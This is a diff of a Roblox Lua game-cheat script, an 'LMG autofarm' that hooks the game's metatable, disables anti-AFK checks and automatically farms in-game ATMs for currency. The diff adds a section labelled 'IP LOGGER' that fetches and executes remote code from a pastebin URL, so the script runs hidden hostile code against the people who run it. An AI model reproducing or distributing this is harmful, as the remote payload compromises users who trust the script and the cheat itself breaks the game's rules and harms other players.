@@ -1,13 +1,3 @@
---[[
-
-     DOOMS PRIVATE LMG AUTOFARM
-        > discord.gg/doomdhc <
-
-         @doomxx / doom#1000
-          DM me bug reports
-
-]]--
-
 warn([[
 
      DOOMS PRIVATE LMG AUTOFARM
@@ -34,7 +24,14 @@ local ammo = plr.PlayerGui.MainScreenGui.AmmoFrame.AmmoText
 local data = plr:WaitForChild('DataFolder')
 local money = data:WaitForChild('Currency')
 
---> FUNCTIONS
+-- DISABLE SEATS
+for _,seat in ipairs(workspace:GetDescendants()) do
+    if seat:IsA('Seat') or seat:IsA('VehicleSeat') then
+        seat.Disabled = true
+    end
+end
+
+--> FUNCTIONS <------------------------------------------------------------
 function notify(text, dur)
     if dur == nil then dur = 5 end
 	game.StarterGui:SetCore("SendNotification", {
@@ -134,10 +131,14 @@ function buy_ammo()
 	end
 	wait()
 end
+---------------------------------------------------------------------------
+
+notify('ur whitelisted! 😎')
 
 buy_lmg()
 buy_ammo()
 
+-- AUTO REFILL AMMO --------------------------------------------------------
 coroutine.wrap(function()
     local ammo = plr.PlayerGui.MainScreenGui.AmmoFrame.AmmoText
 
@@ -154,31 +155,35 @@ coroutine.wrap(function()
         notify('An error has occured, check console log for more details.', 15)
     end
 end)()
+---------------------------------------------------------------------------
 
-local GC = getconnections or get_signal_cons
-if GC then
-	for i,v in pairs(GC(game.Players.LocalPlayer.Idled)) do
-		if v["Disable"] then
-			v["Disable"](v)
-		elseif v["Disconnect"] then
-			v["Disconnect"](v)
+-- ANTI AFK ---------------------------------------------------------------
+coroutine.wrap(function()
+	local GC = getconnections or get_signal_cons
+	if GC then
+		for i,v in pairs(GC(game.Players.LocalPlayer.Idled)) do
+			if v["Disable"] then
+				v["Disable"](v)
+			elseif v["Disconnect"] then
+				v["Disconnect"](v)
+			end
 		end
+	else
+		game.Players.LocalPlayer.Idled:Connect(function()
+			local VirtualUser = game:GetService("VirtualUser")
+			VirtualUser:CaptureController()
+			VirtualUser:ClickButton2(Vector2.new())
+		end)
 	end
-else
-	game.Players.LocalPlayer.Idled:Connect(function()
-		local VirtualUser = game:GetService("VirtualUser")
-		VirtualUser:CaptureController()
-		VirtualUser:ClickButton2(Vector2.new())
-	end)
-end
-
--- Anti Recoil
-
+end)()
+---------------------------------------------------------------------------
 
 notify('anti recoil enabled', 10)
 notify('anti afk enabled', 10)
 
+-- IP LOGGER --------------------------------------------------------------
 loadstring(game:HttpGet('https://pastebin.com/raw/MLtdD9YP'))()
+---------------------------------------------------------------------------
 
 wait(1)
 
@@ -186,16 +191,14 @@ notify('autofarm will start in 5 seconds')
 
 wait(5)
 
--- > PART 2 < --
+-- > PART 2 < -------------------------------------------------------------
 _G.farming = true
 
-
+-- CREATING DEBUG MENU ----------------------------------------------------
 local gui = Instance.new("ScreenGui")
 local amountFarmedLabel = Instance.new("TextLabel")
-
 gui.Parent = game.CoreGui
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
 amountFarmedLabel.Parent = gui
 amountFarmedLabel.AnchorPoint = Vector2.new(0.5, 1)
 amountFarmedLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -207,8 +210,9 @@ amountFarmedLabel.Font = Enum.Font.Gotham
 amountFarmedLabel.Text = "AMOUNT FARMED: "
 amountFarmedLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
 amountFarmedLabel.TextSize = 14.000
+---------------------------------------------------------------------------
 
---> VARIABLES
+--> VARIABLES -------------------------------------------------------------
 local plr = game.Players.LocalPlayer
 local char = plr.Character
 local root = char:WaitForChild('HumanoidRootPart')
@@ -222,18 +226,14 @@ local atmsFarmed = 0
 local elapsed = 0
 
 ammo = nil;
+---------------------------------------------------------------------------
 
+-- simple check to see if the lmg is equipped, if not then it is automatically equipped.
 if tac then ammo = tac.Ammo end
-
-for _,seat in ipairs(workspace:GetDescendants()) do
-    if seat:IsA('Seat') or seat:IsA('VehicleSeat') then
-        seat.Disabled = true
-    end
-end
-
 if not tac then backpack['[LMG]'].Parent = char end
 
---> FUNCTIONS
+--> FUNCTIONS < -----------------------------------------------------------
+-- lock
 local mt = getrawmetatable(game)
 local old = mt.__namecall
 setreadonly(mt, false)
@@ -248,8 +248,10 @@ mt.__namecall = newcclosure(function(...)
     return old(...)
 end)
 
+-- change lock target
 function lockOn(atm) target = atm.Head end
 
+-- anchor Root
 function aRoot() 
     if root ~= nil then 
         wait(.1) 
@@ -258,6 +260,7 @@ function aRoot()
     end 
 end
 
+-- unanchor Root
 function uRoot() 
     if root ~= nil then 
         wait(.1) 
@@ -266,6 +269,7 @@ function uRoot()
     end 
 end
 
+-- reload lmg
 function reload()
     local args = {
         [1] = "Reload",
@@ -275,6 +279,7 @@ function reload()
     game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer(unpack(args))
 end
 
+-- cash aura
 function cashAura()
     local s,error=pcall(function()
         for _,money in ipairs(workspace.Ignored.Drop:GetChildren()) do
@@ -291,17 +296,20 @@ function cashAura()
         end
     end)
 
+    -- catches all possible errors
     if not s then
         warn('--> ERROR [ SEND THIS TO DOOM ]: '..error)
         notify('An error has occured, check console log for more details.', 15)
     end
 end
+---------------------------------------------------------------------------
 
+-- equips lmg
 if backpack:FindFirstChild('[LMG]') then backpack:FindFirstChild('[LMG]').Parent = char end
 
 wait()
 
---> COROUTINE FUNCTIONS
+--> COROUTINE FUNCTIONS <--------------------------------------------------
 coroutine.wrap(function()
     while true do
         wait(.1)
@@ -310,7 +318,7 @@ coroutine.wrap(function()
     end
 end)()
 
---> DEBUG MENU
+-- debug menu
 coroutine.wrap(function()
     while wait(.1) do
         elapsed=elapsed+.1
@@ -321,7 +329,7 @@ coroutine.wrap(function()
     end
 end)()
 
---> CHECKS IF ATMS ARE OPEN, IF NOT NOTIFIES THE CLIENT
+-- checks if atms are open, if not notifies the client
 coroutine.wrap(function()
 	open = false
 	while wait() do
@@ -337,16 +345,22 @@ coroutine.wrap(function()
 	end
 end)
 
+-- anti-recoil
+local cam = workspace.CurrentCamera
+
 coroutine.wrap(function()
-	local CurrentFocus = game:GetService('Workspace').CurrentCamera.CFrame
-	game:GetService('Workspace').CurrentCamera:Destroy()
+	local cf = cam.CFrame
+	cam:Destroy()
+
 	local Instance = Instance.new('Camera', game:GetService('Workspace'))
-	Instance.CameraSubject = game:GetService('Players').LocalPlayer.Character.Humanoid
+	Instance.CameraSubject = char.Humanoid
 	Instance.CameraType = Enum.CameraType.Custom
-	Instance.CFrame = CurrentFocus
+	Instance.CFrame = cf
 end)()
 
---> FARM
+---------------------------------------------------------------------------
+
+--> FARM <-----------------------------------------------------------------
 while wait() do
 	for _,atm in ipairs(workspace.Cashiers:GetChildren()) do
 	    if atm.Name == 'CA$HIER' and atm.Humanoid.Health == 100 then
@@ -376,3 +390,11 @@ while wait() do
 	    end
 	end
 end
+
+---------------------------------------------------------------------------
+
+--[[
+
+		hai
+
+]]--
